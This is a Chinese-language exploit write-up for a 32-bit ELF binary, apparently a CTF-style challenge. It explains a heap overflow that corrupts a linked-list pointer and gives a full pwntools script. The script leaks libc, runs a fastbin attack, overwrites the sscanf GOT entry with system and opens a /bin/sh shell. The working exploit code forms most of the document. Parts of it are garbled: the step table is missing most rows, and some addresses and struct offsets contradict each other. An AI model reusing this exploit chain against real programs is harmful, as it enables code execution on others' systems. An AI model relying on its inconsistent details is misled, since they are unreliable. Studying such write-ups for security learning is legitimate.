# 漏洞利用文档

## 执行环境

基于反编译代码和exp分析，程序的执行环境如下：

- **二进制类型**：32位ELF可执行文件，x86架构
- **安全机制**：
  - 栈保护（Stack Canary）：启用（从`__readgsdword(0x14u)`可见）
  - NX（No-Execute）：启用（堆栈不可执行）
  - PIE（Position Independent Executable）：禁用（地址固定）
  - RELRO（Relocation Read-Only）：部分或未启用（GOT表可写）
- **依赖库**：标准C库（libc），通过ldd推断需要libc.so.6
- **运行需求**：Linux环境，需要交互式输入支持

关键全局变量地址固定：
- `dword_804A288` (链表头)：0x804a288
- `dword_804A2A8` (消息缓冲区)：0x804a2c0
- GOT表地址：0x804a000附近

## 漏洞成因

### 关键结构体分析
程序使用链表管理步枪对象，每个步枪对象结构如下：
```c
struct rifle {
    char description[56];    // 从chunk起始地址开始
    char name[56];          // 从chunk+25开始
    struct rifle *next;     // 存储在chunk+52位置
};
```

### 漏洞类型：堆溢出（Heap Overflow）

**漏洞位置**：在`sub_8048644()`函数中：
```c
fgets(dword_804A288 + 25, 56, stdin);  // 写入name字段
```

**漏洞分析**：
1. 分配堆块大小为0x38字节（56字节用户数据）
2. name字段从chunk+25开始写入56字节
3. 实际写入范围：chunk+25 到 chunk+25+56 = chunk+81
4. 但chunk用户数据只有56字节（chunk+0 到 chunk+56）
5. 导致溢出25字节，覆盖相邻堆块元数据或全局变量

**漏洞触发条件**：
- 通过精心构造的name字段，可以覆盖chunk末尾的next指针
- 结合多次分配释放操作，可以实现任意地址读写

## 漏洞利用过程

### 利用步骤及内存变化

| 2 | `leakLibc()` | - 遍历链表显示步枪<br>- 读取chunk+48处的puts GOT值<br>- 计算libc基址和system地址 | 泄露libc基址 |
| 3 | `addRifles(0x3f)` | - 创建63个步枪并提交订单<br>- 堆布局塑造，创建fastbin链<br>- 计数器：A2A4=64, A2A0=63 | 准备堆布局用于攻击 |
| 4 | `addRifle(b'1'*0x1b + p32(0x804a2a8), b'15935728')` | - 分配新堆块<br>- name溢出覆盖next指针为消息缓冲区地址0x804a2a8<br>- 链表结构被破坏 | 将链表指向可控区域 |

| 10 | `p.interactive()` | - 完全进入交互式shell环境<br>- 内存映射完全切换 | 维持shell会话 |

### 堆布局演变
1. **初始状态**：空堆，全局变量初始化为0
2. **步骤1-2**：单链表结构，包含泄露用的堆块
3. **步骤3**：大量堆块分配释放，fastbin形成
4. **步骤4-6**：堆溢出污染fastbin链，指向全局变量区
5. **步骤7-8**：通过fastbin攻击实现GOT覆盖
6. **步骤9-10**：成功获取shell，内存完全切换

## Exploit

```python
from pwn import *
from LibcSearcher import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample18')
p = process('./data/sample18')
libc = elf.libc

def addRifle(name, desc):
    p.sendline(b'1')
    p.sendline(name)
    p.sendline(desc)

def leakLibc():
    p.sendline(b'2')
    print(p.recvuntil(b'Description: '))
    print(p.recvuntil(b'Description: '))
    leak = p.recvline()
    puts = u32(leak[0:4])
    libc_base = puts - libc.symbols['puts']
    return libc_base

def orderRifles():
    p.sendline(b'3')

def leaveMessage(content):
    p.sendline(b'4')
    p.sendline(content)

def addRifles(count):
    for i in range(count):
        addRifle(b'1'*0x1b + p32(0x0), b'1593')
        orderRifles()

# 步骤1: 通过堆溢出覆盖next指针为puts GOT地址，准备泄露libc
addRifle(b'0'*0x1b + p32(elf.got['puts']), b'15935728')

# 步骤2: 泄露libc地址并计算system地址
libc_base = leakLibc()
system = libc_base + libc.symbols['system']

# 步骤3: 大量分配释放堆块，塑造堆布局
addRifles(0x3f)

# 步骤4: 添加特殊步枪，溢出覆盖next指针为消息缓冲区地址
addRifle(b'1'*0x1b + p32(0x804a2a8), b'15935728')

# 步骤5: 在消息缓冲区伪造堆块大小0x81，准备fastbin攻击
leaveMessage(p32(0)*9 + p32(0x81))

# 步骤6: 提交订单触发释放，污染fastbin链
orderRifles()

# 步骤7: 添加步枪，使fd指针指向sscanf GOT地址
addRifle(b'15935728', p32(elf.got['__isoc99_sscanf']))

# 步骤8: 覆盖sscanf GOT条目为system地址
leaveMessage(p32(system))

# 步骤9: 发送/bin/sh字符串，触发system执行
p.sendline(b'/bin/sh')

# 步骤10: 进入交互式shell
p.interactive()
```

### 关键注释说明
- **堆溢出利用**：通过精心构造的name字段（27字节填充 + 4字节目标地址），利用堆溢出覆盖next指针
- **libc泄露**：通过遍历链表读取被覆盖的GOT地址，计算libc基址
- **fastbin攻击**：通过污染fastbin链，使malloc返回可控地址（全局变量区）
- **GOT劫持**：覆盖`__isoc99_sscanf`的GOT条目，将输入解析函数替换为system
- **参数传递**：当程序调用sscanf解析用户输入时，实际执行system("/bin/sh")

该利用成功结合了堆溢出、UAF、fastbin攻击和GOT覆盖技术，最终实现了任意代码执行。
